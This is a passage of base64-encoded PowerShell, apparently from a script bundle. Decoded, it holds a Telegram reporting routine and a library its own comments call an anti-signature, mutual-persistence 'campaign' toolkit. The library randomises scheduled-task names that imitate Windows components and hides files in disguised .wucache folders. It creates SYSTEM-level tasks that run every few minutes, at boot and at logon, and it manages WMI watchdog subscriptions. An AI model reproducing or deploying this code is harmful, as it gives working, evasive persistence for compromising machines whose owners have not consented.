Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE5CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTk6IHJhdGUtbGltaXQg
bmV2ZXIgYmxvY2tzIHdoZW4gR3J5eGEgZnVsbHkgYWJzZW50OyBTdGFydFBlbmRpbmcga2VlcC4K
IyBMMTg6IGV4dGVybWluYXRlIHdhcyBLSUxMSU5HIEdyeXhhIChudWxsLXBhdGggcHJvYyBraWxs
KTsgc3luYyBGUCBiZWZvcmUga2lsbC4KIyBMMTc6IEdyeXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxl
IGFueSBub24tc2V2cnogU0MgUnVubmluZzsgRlAgZHJpZnQgbmV2ZXIgL3guCiMgTDE2OiBORVZF
UiByZWluc3RhbGwgR3J5eGEgd2hlbiBSdW5uaW5nIChwYW5lbCBkdXBsaWNhdGVzKTsgVENQIGFk
dmlzb3J5IG9ubHkuCiMgTDE1OiBncnl4YS1oZWFsdGggLyBncnl4YS1lbnN1cmUg4oCUIDhoIGRl
ZXAgY2hlY2sgKFRDUC9yZWxheS9GUCBkcmlmdCByZWluc3RhbGwpLgojIEwxMzogc2NodGFza3Mg
Q3JlYXRlIHZpYSBjbWQgKGxpa2UgV3VjYWNoZU93biksIFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwu
d3VjYWNoZQojICAgICAgKG5vdCBBQ0wtbG9ja2VkIFByb2dyYW1EYXRhIHBhdGgpLCAvU1QgMDA6
MDAgb24gTUlOVVRFLCBubyBsZWFkaW5nIFwuCiMgTDEyOiBJREVOVFZFUj03IFJPT1QtbGV2ZWwg
dGFzayBuYW1lcyAobmVzdGVkIE1pY3Jvc29mdFxXaW5kb3dzIEFjY2VzcyBEZW5pZWQpLgojIEwx
MTogTkVWRVIgcmV1c2UgcmVhbCBXaW5kb3dzIGJ1aWx0LWluIHRhc2sgbmFtZXM7IFRSIG93bmVy
c2hpcCBjaGVja3MuCiMgQXV0aG9yaXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBl
dGl0aW9uIHNjb3BlIG9ubHkuCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCltDbWRsZXRCaW5kaW5nKCld
CnBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICBbVmFsaWRhdGVT
ZXQoJ2luaXQnLCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tzLWVuc3VyZScs
ICdzdGF0ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0ZXJlZCcsICdleHRlcm1pbmF0
ZScsICdncnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5zdXJlJyldCiAgICBbc3RyaW5nXSRBY3Rpb24s
CiAgICBbc3RyaW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dz
XFdFUlxUZW1wXC53dWNhY2hlJywKICAgIFtzdHJpbmddJE1vblBhdGggPSAnJywKICAgIFtzdHJp
bmddJEJ1aWxkICA9ICdPMTUnLAogICAgW3N0cmluZ10kRXh0cmEgID0gJycsCiAgICBbc3RyaW5n
XSRGcCAgICAgPSAnJywKICAgIFtzd2l0Y2hdJERlZXAsCiAgICBbc3dpdGNoXSRGb3JjZQopCgok
RXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRjZmdQYXRoID0gSm9p
bi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZmcnCiRJZGVudFZlcnNpb24gPSA4CgojIFJvb3Qt
bGV2ZWwgbmFtZXMgV0lUSE9VVCBsZWFkaW5nIGJhY2tzbGFzaCAobWF0Y2hlcyB3b3JraW5nIFd1
Y2FjaGVPd24gc3R5bGUpLgokUG9vbHMgPSBAewogICAgQSA9IEAoJ1dlclF1ZXVlU3luYycsJ0Rp
YWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNhY2hlJywnV2RpSG9zdFByb3h5JywnUGxhU2VydmVySGVh
bHRoJywnVGNwSXBDb25mbGljdFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykK
ICAgIEIgPSBAKCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknLCdXZXJRdWV1ZVN5bmMn
LCdOZXRUcmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdQbGFT
ZXJ2ZXJEaWFnJywnU3JDYWNoZVN5bmMnKQogICAgQyA9IEAoJ1Jlc29sdXRpb25RdWV1ZScsJ05l
dFRyYWNlQ2FjaGUnLCdUY3BJcENvbmZsaWN0UmVzJywnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZGlIb3N0UHJveHknKQog
ICAgRCA9IEAoJ1RjcElwQ29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNh
Y2hlJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1ZVN5bmMnLCdQbGFT
ZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknKQp9CiREZWZhdWx0cyA9IFtvcmRlcmVkXUB7CiAg
ICBUQVNLX0EgPSAnV2VyUXVldWVTeW5jJwogICAgVEFTS19CID0gJ1BsYVNlcnZlckhlYWx0aCcK
ICAgIFRBU0tfQyA9ICdXZGlIb3N0UHJveHknCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJl
cycKICAgIE1PX0EgICA9ICcyJwogICAgTU9fQiAgID0gJzMnCn0KCmZ1bmN0aW9uIEdldC1Ib3N0
U2VlZCB7CiAgICAkcyA9IDBMCiAgICBmb3JlYWNoICgkYyBpbiAkZW52OkNPTVBVVEVSTkFNRS5U
b1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICsgW2ludF0kYykgJSAxMDAw
MDAwMDA3IH0KICAgIHJldHVybiAkcwp9CgpmdW5jdGlvbiBSZWFkLUlkZW50aXR5IHsKICAgICRp
ZCA9ICREZWZhdWx0cy5DbG9uZSgpCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAg
ICAgZm9yZWFjaCAoJGxpbmUgaW4gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAt
Rm9yY2UpKSB7CiAgICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9
XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQogICAgICAg
IH0KICAgIH0KICAgIHJldHVybiAkaWQKfQoKZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3Ry
aW5nXSR0bikgewogICAgaWYgKCR0bikgeyAmIHNjaHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4g
L0YgMj4mMSB8IE91dC1OdWxsIH0KfQoKZnVuY3Rpb24gR2V0LVRhc2tWZXJib3NlQmxvYihbc3Ry
aW5nXSR0bikgewogICAgaWYgKC1ub3QgJHRuKSB7IHJldHVybiAnJyB9CiAgICAkb3V0ID0gJiBz
Y2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRM
QVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgeyByZXR1cm4gJycgfQogICAgcmV0dXJu
ICgoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9KSAtam9pbiAiYG4iKQp9CgpmdW5jdGlv
biBUZXN0LVRhc2tPd25zTW9uKFtzdHJpbmddJHRuLCBbc3RyaW5nXSRtYXJrZXIpIHsKICAgICMg
VHJ1ZSBvbmx5IGlmIHRoZSBzY2hlZHVsZWQgYWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBw
YXRoIOKAlCBub3QgYSBXaW5kb3dzIENPTSBoYW5kbGVyLgogICAgJGJsb2IgPSBHZXQtVGFza1Zl
cmJvc2VCbG9iICR0bgogICAgaWYgKC1ub3QgJGJsb2IpIHsgcmV0dXJuICRmYWxzZSB9CiAgICBp
ZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYXJrZXIpKSkg
eyByZXR1cm4gJHRydWUgfQogICAgaWYgKCRibG9iIC1tYXRjaCAnKD9pKVwud3VjYWNoZVxcfG93
bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC5ldGxjYWNoZVxcJykgeyByZXR1cm4gJHRydWUgfQog
ICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBJbml0aWFsaXplLUlkZW50aXR5IHsKICAgICMg
SWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4gUG9vbCB1cGdyYWRlcyBi
dW1wIElERU5UVkVSOgogICAgIyBvd25lZCBvbGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZDsgV2lu
ZG93cyBidWlsdC1pbnMgd2l0aCBzYW1lIG5hbWUgYXJlIGxlZnQgYWxvbmUuCiAgICBpZiAoVGVz
dC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkKICAgICAgICAj
IEw3OiBhbHNvIHJlZ2VuZXJhdGUgaWYgYW55IFRBU0tfKiBpcyBlbXB0eSAoTDQtTDYgbW9kdWxv
L2Nhc3QgYnVncyBsZWZ0IGJsYW5rIHNsb3RzKQogICAgICAgICRzbG90c09rID0gKCRvbGRbJ0lE
RU5UVkVSJ10gLWVxICIkSWRlbnRWZXJzaW9uIikgLWFuZCAkb2xkWydUQVNLX0EnXSAtYW5kICRv
bGRbJ1RBU0tfQiddIC1hbmQgJG9sZFsnVEFTS19DJ10gLWFuZCAkb2xkWydUQVNLX0QnXQogICAg
ICAgIGlmICgkc2xvdHNPaykgeyByZXR1cm4gJG9sZCB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4g
J1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsKICAgICAgICAgICAgJHRuID0g
W3N0cmluZ10kb2xkWyRrXQogICAgICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQog
ICAgICAgICAgICAjIE5ldmVyIGRlbGV0ZSBhIHJlYWwgV2luZG93cyB0YXNrIHdlIG5ldmVyIG93
bmVkIChUUiBpcyBDT00vY3VzdG9tIGhhbmRsZXIpLgogICAgICAgICAgICBpZiAoVGVzdC1UYXNr
T3duc01vbiAkdG4gJycpIHsgUmVtb3ZlLVRhc2tRdWlldCAkdG4gfQogICAgICAgIH0KICAgICAg
ICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlCiAgICB9CiAgICAkcyA9
IEdldC1Ib3N0U2VlZAogICAgIyBMNDogdHdvIHNsb3RzIG1heSBoYXNoIHRvIHRoZSBzYW1lIHRh
c2sgcGF0aCAocG9vbHMgc2hhcmUgbmFtZXMpIC0+CiAgICAjIG9uZSBwaHlzaWNhbCB0YXNrIHRo
ZW4gc2F0aXNmaWVzIHR3byBzbG90cyBhbmQgdGhlIGZsZWV0IHNob3dzIDMvNC4KICAgICMgV2Fs
ayBlYWNoIHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNsb3Rz
LgogICAgIyBMNjogdGhlIG9sZCBAKEAoJ0EnLCAkcyAlIDgpLCAuLi4pIGZvcm0gd2FzIGRvdWJs
ZS1icm9rZW4gaW4gUFMgNS4xOgogICAgIyBiYXJlICUgaW5zaWRlIEAoKSBwYXJzZXMgYXMgdGhl
IEZvckVhY2gtT2JqZWN0IGFsaWFzIChub3QgbW9kdWxvKSwgc28gdGhlCiAgICAjIGNvbGxlY3Rp
b24gY29sbGFwc2VkIGFuZCB0aGUgbG9vcCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBF
TVBUWQogICAgIyBUQVNLXyogYW5kIHRoZSB3aG9sZSBmbGVldCBmZWxsIGJhY2sgdG8gaWRlbnRp
Y2FsIGRlZmF1bHQgdGFzayBuYW1lcy4KICAgICRzZWVkcyA9IFtvcmRlcmVkXUB7CiAgICAgICAg
QSA9ICgkcyAlIDgpCiAgICAgICAgQiA9ICgoJHMgKyAzKSAlIDgpCiAgICAgICAgQyA9ICgoJHMg
KyA1KSAlIDgpCiAgICAgICAgRCA9ICgoJHMgKyA3KSAlIDgpCiAgICB9CiAgICAkcGljayA9IFtv
cmRlcmVkXUB7fQogICAgZm9yZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsKICAg
ICAgICAkaSA9IFtpbnRdJHNlZWRzWyRsZXR0ZXJdCiAgICAgICAgJG5hbWUgPSAkUG9vbHNbJGxl
dHRlcl1bJGldCiAgICAgICAgJG4gPSAwCiAgICAgICAgd2hpbGUgKCRwaWNrLlZhbHVlcyAtY29u
dGFpbnMgJG5hbWUgLWFuZCAkbiAtbHQgOCkgeyAkaSA9ICgkaSArIDEpICUgODsgJG5hbWUgPSAk
UG9vbHNbJGxldHRlcl1bJGldOyAkbisrIH0KICAgICAgICBpZiAoLW5vdCAkbmFtZSkgeyAkbmFt
ZSA9ICREZWZhdWx0c1siVEFTS18kbGV0dGVyIl0gfQogICAgICAgICRwaWNrWyRsZXR0ZXJdID0g
JG5hbWUKICAgIH0KICAgICRjZmcgPSBAKAogICAgICAgICJUQVNLX0E9JCgkcGljay5BKSIKICAg
ICAgICAiVEFTS19CPSQoJHBpY2suQikiCiAgICAgICAgIlRBU0tfQz0kKCRwaWNrLkMpIgogICAg
ICAgICJUQVNLX0Q9JCgkcGljay5EKSIKICAgICAgICAiTU9fQT0kKDIgKyAoJHMgJSA0KSkiICAg
ICAgICAgICMgMi01IG1pbiBqaXR0ZXIKICAgICAgICAiTU9fQj0kKDMgKyAoKCRzICsgMSkgJSAz
KSkiICAgICMgMy01IG1pbiBqaXR0ZXIKICAgICAgICAiU0VFRD0kcyIKICAgICAgICAiSURFTlRW
RVI9JElkZW50VmVyc2lvbiIKICAgICkKICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2Zn
UGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UKICAgIHJldHVybiAoUmVhZC1JZGVudGl0eSkKfQoKZnVu
Y3Rpb24gTm9ybWFsaXplLVRhc2tOYW1lKFtzdHJpbmddJHRuKSB7CiAgICBpZiAoLW5vdCAkdG4p
IHsgcmV0dXJuICcnIH0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcpCn0KCmZ1
bmN0aW9uIFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7CiAgICAkbG9nID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIHRyeSB7IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAkbSAtRm9yY2UgfSBjYXRjaCB7fQp9CgpmdW5jdGlvbiBFbnN1cmUtUGVyc2lzdFRh
c2tzIHsKICAgICMgTWlycm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNjaHRh
c2tzLCBCT09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuCiAgICAkaWQgPSBJbml0aWFsaXplLUlk
ZW50aXR5CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29y
a0RpciAnb3duX21vbi5jbWQnIH0KICAgICRib290ID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9v
dCAnVGVtcFwud3VjYWNoZScKICAgICRldGxEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0
XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUnCiAgICBmb3JlYWNoICgkZCBpbiBAKCRib290LCAk
ZXRsRGlyKSkgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkg
eyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRkIC1Gb3JjZSB8IE91dC1OdWxs
IH0KICAgIH0KICAgICRib290TW9uID0gSm9pbi1QYXRoICRib290ICdvd25fbW9uLmNtZCcKICAg
ICRib290RXRsID0gSm9pbi1QYXRoICRib290ICdldGxfbW9uLmNtZCcKICAgICRldGxNb24gPSBK
b2luLVBhdGggJGV0bERpciAnZXRsX21vbi5jbWQnCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFs
UGF0aCAkTW9uUGF0aCkgewogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGgg
LURlc3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRi
b290RXRsIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIENvcHkt
SXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRldGxNb24gLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICB9CiAgICAjIEJPT1QgaXMgbm90IExvY2tE
aXInZCBieSBvd25fc2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBUUiB0aGVy
ZS4KICAgICR0ck1vbiA9ICJjbWQuZXhlIC9jICRib290TW9uIgogICAgJHRyRXRsID0gImNtZC5l
eGUgL2MgJGJvb3RFdGwiCiAgICAkbW9BID0gW3N0cmluZ10kaWRbJ01PX0EnXTsgaWYgKC1ub3Qg
JG1vQSkgeyAkbW9BID0gJzInIH0KICAgICRtb0IgPSBbc3RyaW5nXSRpZFsnTU9fQiddOyBpZiAo
LW5vdCAkbW9CKSB7ICRtb0IgPSAnMycgfQogICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygn
SEg6bW0nKQogICAgJHNwZWNzID0gQCgKICAgICAgICBAeyBLZXkgPSAnVEFTS19BJzsgTWFya2Vy
ID0gJ293bl9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9BOyBUciA9ICR0ck1vbiB9
CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9ICdldGxfbW9uLmNtZCc7IFNjID0g
J01JTlVURSc7IE1vID0gJG1vQjsgVHIgPSAkdHJFdGwgfQogICAgICAgIEB7IEtleSA9ICdUQVNL
X0MnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIg
PSAkdHJNb24gfQogICAgICAgIEB7IEtleSA9ICdUQVNLX0QnOyBNYXJrZXIgPSAnb3duX21vbi5j
bWQnOyBTYyA9ICdPTkxPR09OJzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQogICAgKQogICAgJG9r
ID0gMDsgJHJlYXJtZWQgPSAwOyAkZmFpbCA9IDAKICAgIGZvcmVhY2ggKCRzcCBpbiAkc3BlY3Mp
IHsKICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXld
KQogICAgICAgIGlmICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9CiAgICAgICAgaWYg
KFRlc3QtVGFza093bnNNb24gJHRuICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAg
ICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSB7ICRvaysrOyBj
b250aW51ZSB9CiAgICAgICAgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAgICAg
IGlmICgtbm90ICRibG9iKSB7ICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAoIlwkdG4iKSB9
CiAgICAgICAgaWYgKCRibG9iKSB7CiAgICAgICAgICAgICRvdXJzQnJva2VuID0gKCRibG9iIC1t
YXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC53dWNhY2hlXFx8XC5ldGxjYWNo
ZVxcJykKICAgICAgICAgICAgaWYgKC1ub3QgJG91cnNCcm9rZW4pIHsgJGZhaWwrKzsgV3JpdGUt
T3duTG9nICJ0YXNrc19za2lwX2ZvcmVpZ24gJHRuIjsgY29udGludWUgfQogICAgICAgICAgICBS
ZW1vdmUtVGFza1F1aWV0ICR0bgogICAgICAgICAgICBSZW1vdmUtVGFza1F1aWV0ICgiXCR0biIp
CiAgICAgICAgfQogICAgICAgICMgQnVpbGQgY21kbGluZSBleGFjdGx5IGxpa2Ugb3duLmNtZCBk
ZXRhY2ggKHByb3ZlbiB0byB3b3JrIGFzIFNZU1RFTSkuCiAgICAgICAgJHBhcnRzID0gQCgKICAg
ICAgICAgICAgJy9DcmVhdGUnLCAnL1ROJywgJHRuLCAnL1JVJywgJ1NZU1RFTScsICcvUkwnLCAn
SElHSEVTVCcsICcvRicsCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0MnLCAkc3AuU2MK
ICAgICAgICApCiAgICAgICAgaWYgKCRzcC5TYyAtZXEgJ01JTlVURScpIHsKICAgICAgICAgICAg
JHBhcnRzICs9IEAoJy9NTycsICRzcC5NbywgJy9TVCcsICRzdCkKICAgICAgICB9CiAgICAgICAg
JGFyZ0xpbmUgPSAoJHBhcnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBpZiAoJF8g
LW1hdGNoICdbXHMiXScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9IGVs
c2UgeyAkXyB9CiAgICAgICAgfSkgLWpvaW4gJyAnCiAgICAgICAgJGNyZWF0ZVR4dCA9IGNtZC5l
eGUgL2MgInNjaHRhc2tzLmV4ZSAkYXJnTGluZSIgMj4mMSB8IEZvckVhY2gtT2JqZWN0IHsgIiRf
IiB9CiAgICAgICAgJGNyZWF0ZUpvaW5lZCA9ICgkY3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgp
CiAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGUgJCgkc3AuS2V5KSAkdG4gPT4gJGNy
ZWF0ZUpvaW5lZCIKICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRzcC5NYXJrZXIp
IC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSkgewogICAgICAgICAg
ICAkcmVhcm1lZCsrCiAgICAgICAgICAgIGlmICgkc3AuS2V5IC1lcSAnVEFTS19BJyAtb3IgJHNw
LktleSAtZXEgJ1RBU0tfQicpIHsKICAgICAgICAgICAgICAgIGNtZC5leGUgL2MgInNjaHRhc2tz
LmV4ZSAvUnVuIC9UTiBgIiR0bmAiIiB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9
IGVsc2UgewogICAgICAgICAgICAkZmFpbCsrCiAgICAgICAgICAgIFdyaXRlLU93bkxvZyAidGFz
a3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iCiAgICAgICAgfQogICAgfQogICAgcmV0dXJu
ICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBmYWlsPSRmYWlsIgp9CgpmdW5jdGlvbiBS
ZW1vdmUtV2F0Y2hkb2cgewogICAgZm9yZWFjaCAoJGNscyBpbiBAKCdfX0ZpbHRlclRvQ29uc3Vt
ZXJCaW5kaW5nJywnX19FdmVudEZpbHRlcicsJ0NvbW1hbmRMaW5lRXZlbnRDb25zdW1lcicsJ19f
SW50ZXJ2YWxUaW1lckluc3RydWN0aW9uJykpIHsKICAgICAgICBHZXQtV21pT2JqZWN0IC1OYW1l
c3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzICRjbHMgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgKCRf
